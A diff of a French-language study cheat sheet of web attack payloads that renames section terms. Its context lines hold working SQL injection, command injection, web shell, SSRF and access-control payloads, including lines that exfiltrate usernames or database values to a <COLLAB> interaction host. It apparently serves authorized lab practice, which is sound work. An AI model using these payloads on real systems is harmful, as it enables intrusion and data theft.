@@ -13,14 +13,14 @@ Tous les placeholders s'écrivent en majuscules entre chevrons. Ils sont à remp
 
 | Placeholder | Signification | Remplacer par |
 |---|---|---|
-| `<COLLAB>` | Sous-domaine d'interaction hors bande | Sous-domaine Burp Collaborator ou domaine de l'exploit server |
+| `<COLLAB>` | Sous-domaine d'interaction out-of-band | Sous-domaine Burp Collaborator ou domaine de l'exploit server |
 | `<COND>` | Condition booléenne testée | Expression vraie ou fausse selon le test, par exemple `1=1` |
 | `<TABLE>` | Nom de table | Nom découvert par énumération |
 | `<COLONNE>` | Nom de colonne | Nom découvert par énumération |
 | `<UTILISATEUR>` | Nom de compte ciblé | Valeur du test |
 | `<N>` | Nombre ou position | Entier à faire varier |
 | `<HOTE>` | Nom d'hôte ou adresse | Cible interne ou externe selon le test |
-| `<HOTEATTENDU>` | Hôte que la liste blanche autorise | Hôte vu dans la requête normale |
+| `<HOTEATTENDU>` | Hôte que l'allowlist autorise | Hôte vu dans la requête normale |
 | `<HOTEEXTERNE>` | Hôte contrôlé par l'attaquant | Domaine de l'exploit server |
 | `<IP>` | Adresse IP | Adresse choisie ou aléatoire selon le test |
 | `<PARAM>` | Nom du paramètre vulnérable | Nom réel dans la requête |
@@ -32,7 +32,7 @@ Tous les placeholders s'écrivent en majuscules entre chevrons. Ils sont à remp
 | `<DELAI>` | Durée du délai en secondes | 10 par défaut |
 
 Autres conventions :
-- Position Intruder : `§X§` garde le format exact de Burp, par exemple `§a§`.
+- Payload position Intruder : `§X§` garde le format exact de Burp, par exemple `§a§`.
 - Encodage dans une URL : `+` vaut espace, `%2b` vaut plus, `%23` vaut dièse, `%3b` vaut point-virgule, `%26` vaut esperluette, `%7c` vaut tube, `%0a` vaut saut de ligne, `%00` vaut octet nul.
 - Dans un cookie, le plus n'est pas décodé comme dans une URL, et le point-virgule s'écrit `%3b`.
 - Chaque ligne de référence (par exemple `SQL-E1`) est un commentaire placé au-dessus du payload. Pour copier un payload, sélectionner uniquement la ligne qui suit ce commentaire.
@@ -45,18 +45,18 @@ Autres conventions :
   - [[#SQL injection - Détection]]
   - [[#SQL injection - Commentaires et conditions]]
   - [[#SQL injection - Union]]
-  - [[#SQL injection - Aveugle booléen]]
+  - [[#SQL injection - Blind boolean-based]]
   - [[#SQL injection - Error-based]]
-  - [[#SQL injection - Délai]]
-  - [[#SQL injection - Hors bande]]
-  - [[#SQL injection - Fichiers et contournement de filtre]]
+  - [[#SQL injection - Time-based]]
+  - [[#SQL injection - Out-of-band]]
+  - [[#SQL injection - Fichiers et bypass de filtre]]
 - [[#Command injection]]
   - [[#Command injection - Détection et sortie visible]]
   - [[#Command injection - Séparateurs]]
-  - [[#Command injection - Délai]]
+  - [[#Command injection - Time-based]]
   - [[#Command injection - Redirection de sortie]]
-  - [[#Command injection - Hors bande]]
-  - [[#Command injection - Contournement de filtre]]
+  - [[#Command injection - Out-of-band]]
+  - [[#Command injection - Bypass de filtre]]
 - [[#Path traversal]]
   - [[#Path traversal - Séquences simples]]
   - [[#Path traversal - Séquences imbriquées]]
@@ -68,34 +68,34 @@ Autres conventions :
 - [[#File upload]]
   - [[#File upload - Web shells]]
   - [[#File upload - Type MIME]]
-  - [[#File upload - Techniques de contournement]]
+  - [[#File upload - Techniques de bypass]]
 - [[#SSRF]]
   - [[#SSRF - Cibles locales]]
   - [[#SSRF - Balayage interne]]
   - [[#SSRF - Représentations d'adresse]]
-  - [[#SSRF - Contournement de liste noire]]
-  - [[#SSRF - Contournement de liste blanche]]
-  - [[#SSRF - Redirection ouverte]]
-  - [[#SSRF - Aveugle]]
+  - [[#SSRF - Bypass de blocklist]]
+  - [[#SSRF - Bypass d'allowlist]]
+  - [[#SSRF - Open redirect]]
+  - [[#SSRF - Blind]]
   - [[#SSRF - Métadonnées cloud]]
 - [[#Access control]]
   - [[#Access control - Accès direct]]
   - [[#Access control - Paramètres et cookies]]
   - [[#Access control - Identifiants]]
   - [[#Access control - Méthode HTTP]]
-  - [[#Access control - En-têtes de réécriture]]
+  - [[#Access control - Headers de réécriture]]
   - [[#Access control - Variantes de chemin]]
   - [[#Access control - Referer]]
 - [[#Authentication]]
   - [[#Authentication - Énumération de comptes]]
   - [[#Authentication - Mots de passe]]
-  - [[#Authentication - Contournement de blocage]]
+  - [[#Authentication - Bypass de l'account lockout]]
   - [[#Authentication - Réinitialisation]]
   - [[#Authentication - Cookie persistant]]
   - [[#Authentication - HTTP Basic]]
 - [[#Multi-factor authentication]]
-  - [[#Multi-factor authentication - Contournement de l'étape]]
-  - [[#Multi-factor authentication - Force brute du code]]
+  - [[#Multi-factor authentication - Bypass de l'étape]]
+  - [[#Multi-factor authentication - Brute force du code]]
   - [[#Multi-factor authentication - Réponse manipulable]]
 - [[#Outils Burp transverses]]
   - [[#Outils Burp - Intruder]]
@@ -107,8 +107,8 @@ Autres conventions :
 
 Note détaillée : [[SQL-injection]] ; fiches : [[SQL-injection-Union-Attacks]], [[Blind-SQL-injection]], [[Error-based SQL Injection]]
 
-**Quand l'utiliser** : un paramètre, un cookie, un en-tête ou un champ du corps est inséré dans une requête SQL.
-**Détection** : envoyer une apostrophe seule, puis deux apostrophes ; une erreur suivie d'un retour à la normale confirme l'injection. Le point d'injection peut aussi se trouver dans le corps de la requête, un cookie ou un en-tête.
+**Quand l'utiliser** : un paramètre, un cookie, un header ou un champ du corps est inséré dans une requête SQL.
+**Détection** : envoyer une apostrophe seule, puis deux apostrophes ; une erreur suivie d'un retour à la normale confirme l'injection. Le point d'injection peut aussi se trouver dans le corps de la requête, un cookie ou un header.
 
 ### SQL injection - Détection
 
@@ -147,7 +147,7 @@ Note détaillée : [[SQL-injection]] ; fiches : [[SQL-injection-Union-Attacks]],
 |---|---|---|---|
 | SQL-C1 | Couper la fin de la requête d'origine | Le filtre qui suit disparaît (par exemple un contrôle de publication) | Commentaire placé juste après la valeur |
 | SQL-C2 | Condition toujours vraie | Tous les enregistrements sont affichés, y compris ceux qui sont masqués | Ne jamais l'envoyer dans une requête qui modifie ou supprime des données |
-| SQL-C3 | Contournement de connexion | Connexion sans mot de passe valide | Champ du mot de passe laissé vide |
+| SQL-C3 | Bypass de connexion | Connexion sans mot de passe valide | Champ du mot de passe laissé vide |
 | SQL-C4 | Choix du commentaire | Fin de requête ignorée | MySQL exige un espace après les deux tirets, d'où `-- -`, ou `--+` dans une URL |
 
 **Tous moteurs**
@@ -330,9 +330,9 @@ La première forme de concaténation MySQL est deux chaînes séparées par un e
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='<TABLE>'-- -
 ```
 
-Le point d'injection peut se trouver dans le corps de la requête, un cookie ou un en-tête ; la réponse doit alors afficher les données pour que l'attaque Union fonctionne.
+Le point d'injection peut se trouver dans le corps de la requête, un cookie ou un header ; la réponse doit alors afficher les données pour que l'UNION attack fonctionne.
 
-### SQL injection - Aveugle booléen
+### SQL injection - Blind boolean-based
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
@@ -402,33 +402,33 @@ Pour automatiser, voir [[#Outils Burp - Intruder]] : une position pour l'index e
 
 ### SQL injection - Error-based
 
-**Quand l'utiliser** : la page n'affiche pas le résultat de la requête, mais une erreur de base de données est visible (erreur verbeuse) ou son absence se remarque (erreur conditionnelle).
+**Quand l'utiliser** : la page n'affiche pas le résultat de la requête, mais une erreur de base de données est visible (verbose error) ou son absence se remarque (conditional error).
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
-| SQL-E1 | Oracle, erreur conditionnelle | Erreur de division par zéro si la condition est vraie, page normale sinon | Choisir `<COND>` avec soin ; ne jamais atteindre une requête qui modifie ou supprime des données |
-| SQL-E2 | Microsoft, erreur conditionnelle | Erreur de division par zéro si la condition est vraie | Message `Divide by zero error` |
-| SQL-E3 | PostgreSQL, erreur conditionnelle | Erreur de division par zéro si la condition est vraie | La sous-requête empêche l'optimiseur de calculer la division à l'avance |
-| SQL-E4 | PostgreSQL, erreur verbeuse | Message `invalid input syntax for type integer` suivi de la valeur | Si le message est tronqué, vider la valeur d'origine du cookie |
-| SQL-E5 | MySQL et MariaDB, erreur verbeuse | Message `XPATH syntax error` suivi de la valeur | Environ 32 caractères affichés ; extraire par tranches avec SUBSTRING |
-| SQL-E6 | Microsoft, erreur verbeuse | Message `Conversion failed when converting the nvarchar value` suivi de la valeur | Une seule ligne par sous-requête |
-| SQL-E7 | Oracle, erreur verbeuse | Message `ORA-31011: XML parsing failed` avec la valeur dans le détail | Une seule ligne par sous-requête (ROWNUM) |
+| SQL-E1 | Oracle, conditional error | Erreur de division par zéro si la condition est vraie, page normale sinon | Choisir `<COND>` avec soin ; ne jamais atteindre une requête qui modifie ou supprime des données |
+| SQL-E2 | Microsoft, conditional error | Erreur de division par zéro si la condition est vraie | Message `Divide by zero error` |
+| SQL-E3 | PostgreSQL, conditional error | Erreur de division par zéro si la condition est vraie | La sous-requête empêche l'optimiseur de calculer la division à l'avance |
+| SQL-E4 | PostgreSQL, verbose error | Message `invalid input syntax for type integer` suivi de la valeur | Si le message est tronqué, vider la valeur d'origine du cookie |
+| SQL-E5 | MySQL et MariaDB, verbose error | Message `XPATH syntax error` suivi de la valeur | Environ 32 caractères affichés ; extraire par tranches avec SUBSTRING |
+| SQL-E6 | Microsoft, verbose error | Message `Conversion failed when converting the nvarchar value` suivi de la valeur | Une seule ligne par sous-requête |
+| SQL-E7 | Oracle, verbose error | Message `ORA-31011: XML parsing failed` avec la valeur dans le détail | Une seule ligne par sous-requête (ROWNUM) |
 | SQL-E8 | PostgreSQL, variante sans le mot CAST | Même message que SQL-E4 | Utile si CAST est filtré |
 | SQL-E9 | MySQL et MariaDB, équivalent de SQL-E5 | Même message que SQL-E5 | Utile si EXTRACTVALUE est filtré |
 | SQL-E10 | MySQL, double requête | Message `Duplicate entry` avec la valeur | Dépend de la version, plutôt pour d'anciennes versions |
-| SQL-E11 | MySQL, erreur conditionnelle | Message `Subquery returns more than 1 row` si la condition est vraie | La division par zéro ne lève pas d'erreur en lecture sur MySQL |
+| SQL-E11 | MySQL, conditional error | Message `Subquery returns more than 1 row` si la condition est vraie | La division par zéro ne lève pas d'erreur en lecture sur MySQL |
 | SQL-E12 | Microsoft, version et utilisateur | Message de conversion avec la valeur | Même mécanisme que SQL-E6 |
 | SQL-E13 | Microsoft, plusieurs lignes | Message de conversion avec la liste | STRING_AGG demande SQL Server 2017 ou plus ; FOR XML PATH pour les versions plus anciennes |
 | SQL-E14 | Oracle, UTL_INADDR | Message `ORA-29257: host` suivi de la valeur | Dépend de la version et des droits réseau |
 | SQL-E15 | Oracle, CTXSYS | Message `ORA-20000` avec la valeur | Exige Oracle Text |
-| SQL-E16 | SQLite, erreur conditionnelle | Message `integer overflow` si la condition est vraie | Oracle conditionnel uniquement, aucune fuite de valeur ; dépend de la version |
+| SQL-E16 | SQLite, conditional error | Message `integer overflow` si la condition est vraie | Conditional error uniquement, aucune fuite de valeur ; dépend de la version |
 | SQL-E17 | PostgreSQL, plusieurs lignes | Message de conversion avec la liste | Message souvent tronqué ; préférer LIMIT 1 OFFSET |
 | SQL-E18 | PostgreSQL, reconnaissance du contexte | Message `argument of AND must be type boolean` | Confirme PostgreSQL |
-| SQL-E19 | PostgreSQL, conditionnel par conversion | Erreur de conversion si la condition est vraie | Alternative à SQL-E3 |
-| SQL-E20 | MySQL, conditionnel par sous-requête | Erreur `more than 1 row` si la condition est vraie | Alternative à SQL-E11 |
+| SQL-E19 | PostgreSQL, conditional error par conversion | Erreur de conversion si la condition est vraie | Alternative à SQL-E3 |
+| SQL-E20 | MySQL, conditional error par sous-requête | Erreur `more than 1 row` si la condition est vraie | Alternative à SQL-E11 |
 | SQL-E21 | Microsoft, CAST | Message de conversion avec la valeur | Équivalent de SQL-E6 |
 | SQL-E22 | Microsoft, erreurs de regroupement | Noms de la forme table.colonne, un par requête | Anciennes versions |
-| SQL-E23 | Microsoft, conditionnel empilé | Erreur si la condition est vraie | Exige les requêtes empilées ; point-virgule en `%3b` dans un cookie |
+| SQL-E23 | Microsoft, conditional error avec stacked queries | Erreur si la condition est vraie | Exige les stacked queries ; point-virgule en `%3b` dans un cookie |
 | SQL-E24 | Oracle, XMLTYPE simplifié | Message ORA-31011 avec la valeur | Version plus courte de SQL-E7 |
 | SQL-E25 | SQLite, oracle JSON | Message `malformed JSON` si la condition est vraie | Extension JSON1 nécessaire |
 
@@ -527,13 +527,13 @@ Le message de SQL-E10 a la forme `Duplicate entry '<valeur>~1' for key 'group_ke
 ' AND (SELECT CASE WHEN (<COND>) THEN json('{') ELSE 1 END)=1-- -
 ```
 
-### SQL injection - Délai
+### SQL injection - Time-based
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
-| SQL-T1 | Délai simple, aucune sortie visible | Réponse plus lente d'environ `<DELAI>` secondes | Mesurer d'abord le temps normal ; refaire avec une durée différente pour vérifier que le temps suit |
-| SQL-T2 | Délai conditionnel | Délai seulement si la condition est vraie | Réglage Intruder : une seule requête simultanée |
-| SQL-T3 | Délai conditionnel avec extraction | Délai si le caractère testé est le bon | PostgreSQL : le point-virgule s'envoie en `%3b` dans un cookie |
+| SQL-T1 | Time-based simple, aucune sortie visible | Réponse plus lente d'environ `<DELAI>` secondes | Mesurer d'abord le temps normal ; refaire avec une durée différente pour vérifier que le temps suit |
+| SQL-T2 | Time-based conditionnel | Délai seulement si la condition est vraie | Réglage Intruder : une seule requête simultanée |
+| SQL-T3 | Time-based conditionnel avec extraction | Délai si le caractère testé est le bon | PostgreSQL : le point-virgule s'envoie en `%3b` dans un cookie |
 | SQL-T4 | Repli quand la pause est filtrée | Durée variable | Imprécis et lourd pour le serveur ; MySQL seulement |
 
 **Oracle**
@@ -578,12 +578,12 @@ Le message de SQL-E10 a la forme `Duplicate entry '<valeur>~1' for key 'group_ke
 ' AND IF(<COND>,BENCHMARK(5000000,SHA1('a')),0)-- -
 ```
 
-### SQL injection - Hors bande
+### SQL injection - Out-of-band
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
-| SQL-O1 | Interaction DNS, Microsoft | Requête DNS reçue par le serveur d'interaction | Droits nécessaires ; requête empilée ; pare-feu sortant possible |
-| SQL-O2 | Interaction DNS, PostgreSQL | Requête DNS reçue | Droits élevés (superutilisateur) ; requête empilée |
+| SQL-O1 | Interaction DNS, Microsoft | Requête DNS reçue par le serveur d'interaction | Droits nécessaires ; stacked query ; pare-feu sortant possible |
+| SQL-O2 | Interaction DNS, PostgreSQL | Requête DNS reçue | Droits élevés (superutilisateur) ; stacked query |
 | SQL-O3 | Interaction DNS, Oracle | Requête DNS reçue | Droits élevés ; à placer dans une expression de la requête |
 | SQL-O4 | Exfiltration | Valeur dans le sous-domaine reçu | Placer la sous-requête dans le sous-domaine ; étiquette DNS limitée à 63 caractères et à des caractères valides |
 | SQL-O5 | Interaction DNS, Oracle via XML | Requêtes DNS et HTTP reçues | Corrigé sur les versions récentes d'Oracle |
@@ -625,7 +625,7 @@ x'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYP
 ' AND LOAD_FILE(CONCAT('\\\\',(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>'),'.<COLLAB>\\a'))-- -
 ```
 
-### SQL injection - Fichiers et contournement de filtre
+### SQL injection - Fichiers et bypass de filtre
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
@@ -655,7 +655,7 @@ x'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYP
 
 À utiliser uniquement dans un environnement autorisé et isolé : ces fonctions sortent du cadre des labs habituels.
 
-**Contournement de filtre**
+**Bypass de filtre**
 
 ```sql
 -- SQL-X1 filtre casse
@@ -680,7 +680,7 @@ Dans un corps XML, encoder les caractères du payload en entités XML pour passe
 
 Note détaillée : [[Command-injection]] ; fiches : [[Command-injection]]
 
-**Quand l'utiliser** : une valeur envoyée à l'application finit dans une commande exécutée par un interpréteur de commandes (valeur de paramètre, en-tête, nom de fichier).
+**Quand l'utiliser** : une valeur envoyée à l'application finit dans une commande exécutée par un interpréteur de commandes (valeur de paramètre, header, nom de fichier).
 **Détection** : envoyer un séparateur suivi d'une commande inoffensive ; observer la sortie, un délai ou une interaction réseau. Le séparateur ne fonctionne que si la commande passe par un interpréteur.
 
 Encodage utile dans une URL : `&` en `%26`, `;` en `%3b`, `|` en `%7c`, saut de ligne en `%0a`, espace en `+` ou `%20`.
@@ -772,7 +772,7 @@ $(id)
 ;
 ```
 
-### Command injection - Délai
+### Command injection - Time-based
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
@@ -835,7 +835,7 @@ Après la redirection, lire le fichier avec `GET <CHEMIN>/<FICHIER>.txt`.
 & whoami > C:\<CHEMIN>\<FICHIER>.txt &
 ```
 
-### Command injection - Hors bande
+### Command injection - Out-of-band
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
@@ -876,7 +876,7 @@ Pour relever les interactions, voir [[#Outils Burp - Collaborator]].
 & nslookup %USERNAME%.<COLLAB> &
 ```
 
-### Command injection - Contournement de filtre
+### Command injection - Bypass de filtre
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
@@ -931,7 +931,7 @@ who^ami
 Note détaillée : [[Path-traversal]] ; fiches : [[Path-traversal-cas-simple]], [[Path-traversal-chemin-absolu]], [[Path-traversal-sequences-et-encodage]], [[Path-traversal-prefixe-et-extension]]
 
 **Quand l'utiliser** : une valeur envoyée par l'utilisateur sert de nom ou de chemin de fichier, par exemple un paramètre de type nom de fichier.
-**Détection** : relever la valeur normale, une valeur inexistante, puis une valeur de traversée, et comparer le code, la taille et le contenu de la réponse. Des séquences en trop restent sans effet à la racine.
+**Détection** : relever la valeur normale, une valeur inexistante, puis une valeur de path traversal, et comparer le code, la taille et le contenu de la réponse. Des séquences en trop restent sans effet à la racine.
 
 Dans les payloads, le paramètre s'écrit `<PARAM>=<valeur>` ; seule la valeur est donnée. Avec curl, utiliser `--path-as-is` ; dans le navigateur, la barre d'adresse normalise les séquences. Dans Burp, contrôler la requête brute réellement envoyée : la saisie peut ré-encoder `%25`.
 
@@ -1081,7 +1081,7 @@ C:\windows\win.ini
 
 ### Path traversal - Fichiers cibles
 
-La lecture dépend des droits du processus. La traversée lit un fichier, pas un répertoire.
+La lecture dépend des droits du processus. Le path traversal lit un fichier, pas un répertoire.
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
@@ -1135,14 +1135,14 @@ C:\windows\system32\inetsrv\config\applicationHost.config
 C:\boot.ini
 ```
 
-La liste Burp dédiée à la traversée est décrite dans [[#Outils Burp - Intruder]].
+La liste Burp dédiée au path traversal est décrite dans [[#Outils Burp - Intruder]].
 
 ## File upload
 
 Note détaillée : [[File-upload]] ; fiches : [[File-upload-web-shell]], [[File-upload-validation-content-type]], [[File-upload-liste-noire]]
 
 **Quand l'utiliser** : l'application accepte un fichier de l'utilisateur et le range dans un répertoire où le serveur exécute les scripts.
-**Détection** : téléverser un fichier inoffensif, retrouver son adresse de service dans l'historique du proxy (filtre Images), puis voir si le dossier exécute les scripts.
+**Détection** : envoyer un fichier inoffensif par file upload, retrouver son adresse de service dans l'historique du proxy (filtre Images), puis voir si le dossier exécute les scripts.
 
 ### File upload - Web shells
 
@@ -1150,7 +1150,7 @@ Note détaillée : [[File-upload]] ; fiches : [[File-upload-web-shell]], [[File-
 |---|---|---|---|
 | FUP-1 | Lecture d'un fichier précis | Contenu du fichier dans la réponse | Web shell PHP minimal |
 | FUP-2 | Exécution de commandes | Sortie de la commande dans la réponse | Web shell PHP polyvalent |
-| FUP-3 | Appel du fichier téléversé | La réponse contient la sortie du script, pas son code | Depuis Repeater, remplacer le nom du fichier de l'URL de service par celui du script ; un texte brut signifie que le dossier n'exécute pas |
+| FUP-3 | Appel du fichier envoyé | La réponse contient la sortie du script, pas son code | Depuis Repeater, remplacer le nom du fichier de l'URL de service par celui du script ; un texte brut signifie que le dossier n'exécute pas |
 
 **PHP**
 
@@ -1174,15 +1174,15 @@ GET <CHEMIN>/<FICHIER>.php?command=id
 Content-Type: image/jpeg
 ```
 
-### File upload - Techniques de contournement
+### File upload - Techniques de bypass
 
-Aucun payload consigné pour l'instant (contournement d'extension, fichier de configuration, traversée dans le nom, signature de contenu, concurrence). Les techniques s'ajoutent ici une par une, avec le même gabarit, au fur et à mesure de l'étude.
+Aucun payload consigné pour l'instant (bypass d'extension, fichier de configuration, path traversal dans le nom, signature de contenu, race condition). Les techniques s'ajoutent ici une par une, avec le même gabarit, au fur et à mesure de l'étude.
 
 ## SSRF
 
 Note détaillée : [[SSRF]] ; fiches : [[SSRF-serveur-local]], [[SSRF-systemes-back-end]], [[SSRF-filtre-liste-noire]], [[SSRF-filtre-liste-blanche]], [[SSRF-redirection-ouverte]], [[SSRF-aveugle]], [[SSRF-surfaces-cachees]]
 
-**Quand l'utiliser** : l'application récupère une adresse fournie ou influençable par l'utilisateur (paramètre contenant une URL, en-tête, import, génération de document).
+**Quand l'utiliser** : l'application récupère une adresse fournie ou influençable par l'utilisateur (paramètre contenant une URL, header, import, génération de document).
 **Détection** : comparer la réponse pour la valeur d'origine, l'hôte local et un hôte inexistant ; une interaction DNS reçue confirme que le serveur résout l'adresse.
 
 Dans les payloads, le paramètre s'écrit `<PARAM>=<valeur>` ; seule la valeur est donnée quand le paramètre est évident.
@@ -1237,7 +1237,7 @@ http://192.168.0.1:§80§/
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
-| SSR-9 | Liste noire qui bloque 127.0.0.1 | La page d'accueil s'affiche | Le client HTTP doit accepter la forme abrégée |
+| SSR-9 | Blocklist qui bloque 127.0.0.1 | La page d'accueil s'affiche | Le client HTTP doit accepter la forme abrégée |
 | SSR-10 | Même cas, forme décimale | Idem | Dépend de l'analyseur du serveur |
 | SSR-11 | Même cas, octal et hexadécimal | Idem | Certains analyseurs ne lisent pas l'octal |
 | SSR-12 | Même cas, IPv6 | Idem | Le service doit écouter en IPv6 |
@@ -1260,7 +1260,7 @@ http://0/
 http://0.0.0.0/
 ```
 
-### SSRF - Contournement de liste noire
+### SSRF - Bypass de blocklist
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
@@ -1283,7 +1283,7 @@ http://spoofed.burpcollaborator.net/
 http://127.0.0.1.nip.io/
 ```
 
-### SSRF - Contournement de liste blanche
+### SSRF - Bypass d'allowlist
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
@@ -1306,12 +1306,12 @@ https://<HOTEATTENDU>.<HOTEEXTERNE>
 http://localhost:80%2523@<HOTEATTENDU>/admin
 ```
 
-### SSRF - Redirection ouverte
+### SSRF - Open redirect
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
-| SSR-24 | Chemin relatif accepté par le filtre, redirection ouverte via un paramètre de l'application | Page interne renvoyée | Le client doit suivre la redirection |
-| SSR-25 | Test préalable de la redirection | Interaction ou en-tête Location | Vérifie que la redirection mène vers un domaine externe |
+| SSR-24 | Chemin relatif accepté par le filtre, open redirect via un paramètre de l'application | Page interne renvoyée | Le client doit suivre la redirection |
+| SSR-25 | Test préalable de la redirection | Interaction ou header Location | Vérifie que la redirection mène vers un domaine externe |
 
 ```text
 # SSR-24 redirection ouverte vers hote interne
@@ -1320,15 +1320,15 @@ http://localhost:80%2523@<HOTEATTENDU>/admin
 <CHEMIN>/redirect?url=http://<COLLAB>
 ```
 
-### SSRF - Aveugle
+### SSRF - Blind
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
 | SSR-26 | Logiciel d'analyse qui récupère le Referer | Interactions DNS puis HTTP | Traitement asynchrone : attendre puis relever les interactions |
 | SSR-27 | Paramètre contenant une URL, sans réponse visible | Interaction DNS et HTTP | Dans les labs, serveur public par défaut seulement |
-| SSR-28 | En-têtes que le serveur peut résoudre | Interaction DNS | Dépend de l'infrastructure |
-| SSR-29 | Cible interne par l'en-tête | Effets de bord seulement | Aveugle ; balayer le dernier octet |
-| SSR-30 | Balayage avec une charge dans un en-tête de navigateur | Interaction reçue avec le nom d'utilisateur en sous-domaine | Charge de type injection de commande par en-tête ; adresse interne dans le Referer |
+| SSR-28 | Headers que le serveur peut résoudre | Interaction DNS | Dépend de l'infrastructure |
+| SSR-29 | Cible interne par le header | Effets de bord seulement | Blind SSRF ; balayer le dernier octet |
+| SSR-30 | Balayage avec un payload dans un header de navigateur | Interaction reçue avec le nom d'utilisateur en sous-domaine | Payload de type command injection par header ; adresse interne dans le Referer |
 
 Un DNS seul sans requête HTTP peut indiquer un filtrage du HTTP sortant ou une simple validation préalable.
 
@@ -1357,10 +1357,10 @@ Cible réelle seulement, hors programme des labs habituels. Preuve minimale : ne
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
-| SSR-31 | AWS, métadonnées version 1 | Liste de clés | La version 2 exige un jeton obtenu par PUT, souvent infaisable en GET seul |
+| SSR-31 | AWS, métadonnées version 1 | Liste de clés | La version 2 exige un token obtenu par PUT, souvent infaisable en GET seul |
 | SSR-32 | AWS, identifiants du rôle | Nom du rôle puis identifiants temporaires | Données très sensibles |
-| SSR-33 | Google Cloud | Réponse seulement avec l'en-tête Metadata-Flavor | En-tête non contrôlable via une SSRF simple |
-| SSR-34 | Azure | Réponse seulement avec l'en-tête Metadata | Idem |
+| SSR-33 | Google Cloud | Réponse seulement avec le header Metadata-Flavor | Header non contrôlable via une SSRF simple |
+| SSR-34 | Azure | Réponse seulement avec le header Metadata | Idem |
 | SSR-35 | Autres schémas | Lecture de fichier ou octets bruts | Rarement acceptés par le client |
 
 ```text
@@ -1422,7 +1422,7 @@ Note détaillée : [[Access-control]] ; fiches : [[Access-control-fonctionnalite
 | ACC-5 | Cookie en clair portant un drapeau de rôle | Fonction d'administration accessible | Échoue si le cookie est signé ou chiffré |
 | ACC-6 | Réponse JSON qui montre déjà un champ de rôle | Champ accepté, rôle changé | Affectation de masse ; le serveur peut ignorer les champs inconnus |
 | ACC-7 | Filtrage par format de contenu | Champ pris en compte | Passer du JSON au formulaire |
-| ACC-8 | Jeton de session | Champ de rôle lisible | Base64 ou JWT ; la signature empêche la modification |
+| ACC-8 | Token de session | Champ de rôle lisible | Base64 ou JWT ; la signature empêche la modification |
 
 ```text
 # ACC-4 parametre role
@@ -1448,7 +1448,7 @@ Cookie: Admin=true
 | ACC-9 | Identifiant numérique dans l'URL | Données d'un autre utilisateur | À tester avec un compte différent ; le contrôle de propriété côté serveur l'empêche |
 | ACC-10 | Identifiant lisible | Données de l'autre utilisateur | Même remarque |
 | ACC-11 | Fichiers statiques à nom séquentiel | Contenu d'un autre utilisateur | Décrémenter ou incrémenter le numéro |
-| ACC-12 | Identifiant dans le corps, un en-tête ou un cookie | Réponse d'un autre utilisateur | Plus d'endroits à tester |
+| ACC-12 | Identifiant dans le corps, un header ou un cookie | Réponse d'un autre utilisateur | Plus d'endroits à tester |
 | ACC-13 | Identifiants imprévisibles mais exposés | Identifiant de la cible trouvé dans une page publique | Chercher dans articles, commentaires et profils |
 | ACC-14 | Compte d'administrateur visé | Valeur d'un champ sensible dans le HTML | La donnée peut être masquée visuellement mais présente dans le source |
 
@@ -1495,13 +1495,13 @@ X-HTTP-Method-Override: PUT
 _method=PUT
 ```
 
-### Access control - En-têtes de réécriture
+### Access control - Headers de réécriture
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
-| ACC-17 | Un front-end bloque l'URL, le serveur d'application lit l'en-tête | Réponse correspondant au chemin de l'en-tête | Envoyer la requête sur la racine ; les paramètres de requête restent dans la ligne de requête réelle |
+| ACC-17 | Un front-end bloque l'URL, le serveur d'application lit le header | Réponse correspondant au chemin du header | Envoyer la requête sur la racine ; les paramètres de requête restent dans la ligne de requête réelle |
 | ACC-18 | Variante de ACC-17 | Idem | Autre implémentation |
-| ACC-19 | Vérifier la prise en compte de l'en-tête | Réponse d'erreur venant de l'application | Ne prouve que la prise en compte, pas l'accès |
+| ACC-19 | Vérifier la prise en compte du header | Réponse d'erreur venant de l'application | Ne prouve que la prise en compte, pas l'accès |
 | ACC-20 | Règle liée à l'adresse source | Accès accordé | Généralement ignoré si non configuré |
 
 ```text
@@ -1551,7 +1551,7 @@ X-Forwarded-For: 127.0.0.1
 
 | Réf. | Situation | Signal attendu | Remarque |
 |---|---|---|---|
-| ACC-23 | Contrôle fondé sur la provenance | Refus sans l'en-tête, succès avec une valeur attendue | Le serveur peut contrôler l'origine complète |
+| ACC-23 | Contrôle fondé sur la provenance | Refus sans le header, succès avec une valeur attendue | Le serveur peut contrôler l'origine complète |
 
 ```text
 # ACC-23 referer
@@ -1563,7 +1563,7 @@ Referer: https://<HOTE>/admin
 Note détaillée : [[Authentication]] ; fiches : [[Auth-brute-force-identifiants]], [[Auth-contournement-blocage]], [[Auth-http-basic]], [[Auth-maintien-connexion]], [[Auth-reinitialisation-mot-de-passe]], [[Auth-modification-mot-de-passe]]
 
 **Quand l'utiliser** : un formulaire de connexion, de réinitialisation ou de changement de mot de passe, ou un cookie de session persistant, est faible.
-**Détection** : comparer entre un nom invalide et un mot de passe invalide la longueur, le statut, le texte, le temps de réponse et les en-têtes de réponse (Set-Cookie, Location).
+**Détection** : comparer entre un nom invalide et un mot de passe invalide la longueur, le statut, le texte, le temps de réponse et les headers de réponse (Set-Cookie, Location).
 
 ### Authentication - Énumération de comptes
 
@@ -1571,8 +1571,8 @@ Note détaillée : [[Authentication]] ; fiches : [[Auth-brute-force-identifiants
 |---|---|---|---|
